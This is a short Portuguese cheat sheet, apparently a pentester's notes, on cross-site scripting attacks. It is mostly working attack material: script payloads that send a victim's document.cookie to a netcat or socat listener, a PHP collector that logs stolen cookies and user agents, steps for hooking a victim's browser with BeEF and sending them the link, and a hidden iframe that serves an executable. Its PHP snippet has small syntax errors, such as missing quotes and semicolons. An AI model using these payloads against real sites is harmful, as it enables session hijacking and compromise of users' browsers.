# 4.1)XSS (Cross Site Scripting)
  * adquirir Cookie do alvo: 
   1. iniciar um listener: nc -nlvp 8081
   2. input do alvo: <script>new Image().src="http://127.0.0.1:<port_8081>/<not_important>.php?"+document.cookie;</script>

  * BEEF - Framework
   1. 127.0.0.1:3000/ui/authentication
    * user: beef passwd: beef
   2. criar código malicioso (ex: <script src="http://127.0.0.1:3000/hook.js"></script>)
   3. injetar o _payload_ no parâmetro vulnerável
   4. enviar a _URL_ para vítima e esperar que ela navegue no web site
   5. selecionar o IP da vítima na Interface Gráfica do BEEF e executar comandos (alguns comandos podem demorar para produzir resultados)

  * Código PHP para captura de informações sobre a vítima<br/>
    <script>new Image().src="http://127.0.0.1:8081;"</script><br/>
    obs.: qualquer número de porta
    obs2.: para receber mais de uma conexão no listener: socat TCP-LISTEN:8081,reuseaddr,fork -
   * coletor.php			
```php
	<?php 
		$cookie=$_GET[cookie'];
		$useragent=$_SERVER[HTTP_USER_AGENT'];
		$file=fopen(cookie.txt','a');
		fwrite($file,"USER AGENT:$useragent || COOKIE:$cookie \n")
		fclose($file)
	?>
```
  1. nano /var/www/html/cookie.txt
  2. service apache2 start
  3. tail -f cookie.txt
  4. injetar _payload_: <script>new Image().src="http:<ip_addr>/coletor.php?cookie="+document.cookie;</script>

  * Problemas de tamanho de campo no _client side_
   1 limited field: Inspect element -> maxlength -> edit -> enter

  * Execução de arquivo remoto
   1 <iframe src="http://127.0.0.1/file.exe" height="0" width="0"></iframe>
